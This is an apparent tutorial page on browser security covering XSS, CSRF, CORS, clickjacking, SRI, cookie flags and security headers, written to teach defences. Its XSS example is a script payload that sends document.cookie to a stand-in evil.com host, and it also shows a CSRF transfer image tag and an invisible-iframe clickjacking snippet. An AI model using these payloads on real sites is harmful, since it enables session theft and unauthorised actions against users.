---
title: "Security in the Browser"
category: "Frontend Fundamentals"
difficulty: "intermediate"
tags: ["XSS", "CSRF", "CSP", "CORS", "SameSite", "security", "iframe", "SRI", "clickjacking"]
order: 14
---

# Security in the Browser

Frontend security is often underestimated. The browser is a hostile environment — your code runs on untrusted machines, processes untrusted data, and communicates across untrusted networks. These are the attacks you must understand and defend against.

---

## Cross-Site Scripting (XSS)

XSS is the #1 web vulnerability. An attacker injects malicious scripts into your page that execute in other users' browsers, stealing cookies, tokens, or performing actions as the victim.

### Types

| Type | How it works |
|---|---|
| **Stored XSS** | Malicious script saved to database, served to all users |
| **Reflected XSS** | Script in URL parameter, reflected back in response |
| **DOM-based XSS** | Script injected via client-side DOM manipulation |

### Attack Example

```javascript
// Vulnerable — attacker posts this comment:
// <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

// Your code unsafely renders it:
commentDiv.innerHTML = userInput; // ❌ executes the script!
```

### Defences

```javascript
// ✅ Use textContent instead of innerHTML for user data
commentDiv.textContent = userInput; // renders as text, not HTML

// ✅ If you must render HTML — sanitize it
import DOMPurify from 'dompurify';
commentDiv.innerHTML = DOMPurify.sanitize(userInput);

// ✅ Use trusted types (enforced by browser)
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (input) => DOMPurify.sanitize(input),
});
div.innerHTML = policy.createHTML(userInput);
```

### Content Security Policy (CSP)

CSP is the most powerful defence against XSS — it tells the browser which sources of content are allowed:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  upgrade-insecure-requests;
```

**Strict CSP with nonces** (best practice):

```html
<!-- Server generates a random nonce per request -->
<script nonce="r4nd0mN0nc3ABC">
  // This script is allowed — nonce matches CSP header
</script>
```

```http
Content-Security-Policy: script-src 'nonce-r4nd0mN0nc3ABC' 'strict-dynamic';
```

`'strict-dynamic'` propagates trust to dynamically loaded scripts — enables modern bundlers without `unsafe-eval`.

---

## Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated user's browser into making unintended requests to your server.

### How It Works

```html
<!-- On attacker's site (evil.com) -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
<!-- Browser automatically sends user's cookies with this request! -->
```

### Defences

#### 1. SameSite Cookie Attribute

```http
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly
```

| Value | Behaviour |
|---|---|
| `Strict` | Cookie never sent cross-site (breaks some OAuth flows) |
| `Lax` | Cookie sent on top-level navigations only (GET) — browser default since 2020 |
| `None` | Cookie always sent cross-site (requires `Secure`) |

#### 2. CSRF Tokens (Synchroniser Token Pattern)

```javascript
// Server embeds a unique token in forms
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<server-generated-token>">
  ...
</form>

// Server validates the token on every state-changing request
```

#### 3. Custom Headers (for AJAX)

```javascript
// Only `fetch` with custom headers — cross-origin requests can't add custom headers
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest', // CSRF signal
  },
  credentials: 'include',
  body: JSON.stringify(data),
});
```

---

## CORS — Cross-Origin Resource Sharing

CORS is a browser security feature — not a server defence (servers don't enforce it, browsers do). The **same-origin policy** blocks JS from reading responses from different origins.

**Origin** = `scheme + host + port`

`https://app.com` and `http://app.com` are different origins.
`https://app.com` and `https://api.app.com` are different origins.

### Simple vs Preflighted Requests

**Simple request** (no preflight): GET/POST with basic headers → browser sends and checks response headers.

**Preflighted request**: Methods other than GET/HEAD/POST, or custom headers → browser first sends `OPTIONS` request:

```
Browser → OPTIONS /api/data HTTP/1.1
          Origin: https://app.com
          Access-Control-Request-Method: DELETE
          Access-Control-Request-Headers: Authorization

Server  → Access-Control-Allow-Origin: https://app.com
          Access-Control-Allow-Methods: DELETE
          Access-Control-Allow-Headers: Authorization
          Access-Control-Max-Age: 86400

Browser → (actual DELETE request if preflight was OK)
```

### Server Headers

```http
Access-Control-Allow-Origin: https://app.com     (or * for public APIs)
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true            (must NOT use * with this)
Access-Control-Max-Age: 86400                     (cache preflight 24h)
```

### Common CORS Mistakes

```javascript
// ❌ This doesn't bypass CORS — CORS is enforced by the BROWSER
// Server-side requests have no CORS restrictions
fetch('https://other-api.com/data'); // blocked by browser if no CORS headers

// ✅ Solutions:
// 1. Configure CORS headers on the target server
// 2. Use a server-side proxy
// 3. Use JSONP (legacy, insecure — avoid)
```

---

## Clickjacking

Attacker embeds your page in an `<iframe>` on their site, overlaying transparent UI:

```html
<!-- evil.com -->
<iframe src="https://bank.com/transfer" style="opacity: 0; position: absolute;"></iframe>
<button style="position: absolute;">Win a prize!</button>
<!-- User clicks "Win a prize" but actually clicks bank's Transfer button -->
```

### Defences

```http
X-Frame-Options: DENY          (don't allow framing by anyone)
X-Frame-Options: SAMEORIGIN    (only same origin can frame)

<!-- Modern CSP equivalent — preferred -->
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

---

## Subresource Integrity (SRI)

Ensure third-party scripts/stylesheets haven't been tampered with:

```html
<script
  src="https://cdn.example.com/library.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>
```

The browser computes the hash of the downloaded file and compares it to the `integrity` attribute. If they don't match, the resource is **blocked**.

Generate the hash:
```bash
cat library.min.js | openssl dgst -sha384 -binary | openssl base64 -A
# Or: npx sri-hash library.min.js
```

---

## Sensitive Data in the Frontend

### What NOT to put in frontend code

```javascript
// ❌ Never expose secrets client-side
const API_KEY = 'sk-abc123'; // visible in DevTools, source, bundles
const DB_URL = 'postgres://...'; // visible to everyone

// ✅ Server-side only — use environment variables server-side
// ✅ Use public (rate-limited) API keys where needed
// ✅ Proxy sensitive requests through your server
```

### Cookie Security Flags

```http
Set-Cookie: token=abc123;
  Secure;        (HTTPS only)
  HttpOnly;      (not accessible via document.cookie — protects from XSS)
  SameSite=Lax;  (CSRF protection)
  Path=/;
  Max-Age=3600
```

### localStorage vs Cookies for Tokens

| Storage | XSS Risk | CSRF Risk | Notes |
|---|---|---|---|
| `localStorage` | HIGH (JS-accessible) | None | Avoid for auth tokens |
| Memory (JS variable) | LOW (lost on refresh) | None | Good for short-lived tokens |
| `HttpOnly` Cookie | None (JS can't read) | Medium (use SameSite) | Best for auth tokens |
| Secure, HttpOnly, SameSite Cookie | ✅ Best | ✅ Protected | Recommended |

---

## Security Headers Checklist

```http
Content-Security-Policy: default-src 'self'; ...
X-Content-Type-Options: nosniff          (prevent MIME sniffing)
X-Frame-Options: DENY                    (clickjacking — use CSP frame-ancestors)
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Cross-Origin-Opener-Policy: same-origin   (required for SharedArrayBuffer)
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

Test your headers at [securityheaders.com](https://securityheaders.com).

---

## Input Validation

**Never trust user input.** Validate on both client AND server (client validation is UX, server validation is security).

```javascript
// ✅ Sanitise before inserting into DOM
const clean = DOMPurify.sanitize(userHtml);

// ✅ Encode for different contexts
// HTML context
function escapeHtml(str) {
  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
            .replace(/"/g,'&quot;').replace(/'/g,'&#039;');
}

// URL context
encodeURIComponent(userInput);

// ✅ Use parameterised queries (server-side — prevents SQL injection)
// db.query('SELECT * FROM users WHERE id = ?', [userId]);
```

---

## HTTPS & TLS

- **Always use HTTPS** — no exceptions for production
- HTTP traffic can be intercepted (man-in-the-middle), injected, and modified
- **HSTS** (Strict-Transport-Security) prevents downgrade attacks and forces HTTPS for future visits
- Use [SSL Labs](https://ssllabs.com/ssltest/) to audit your TLS configuration
- TLS 1.3 only — disable TLS 1.0/1.1

---

## Security Audit Checklist

| ✅ | Check |
|---|---|
| 🔐 | CSP header with nonces, no `unsafe-inline` |
| 🔐 | All cookies have `Secure`, `HttpOnly`, `SameSite` |
| 🔐 | Auth tokens stored in `HttpOnly` cookies, not localStorage |
| 🔐 | All user input sanitised before DOM insertion |
| 🔐 | No secrets in client-side JavaScript |
| 🔐 | CSRF protection on all state-changing endpoints |
| 🔐 | `X-Frame-Options: DENY` or CSP `frame-ancestors: none` |
| 🔐 | SRI for all third-party scripts |
| 🔐 | `X-Content-Type-Options: nosniff` |
| 🔐 | HTTPS everywhere + HSTS preloaded |
| 🔐 | Dependency audit (`npm audit`) in CI |
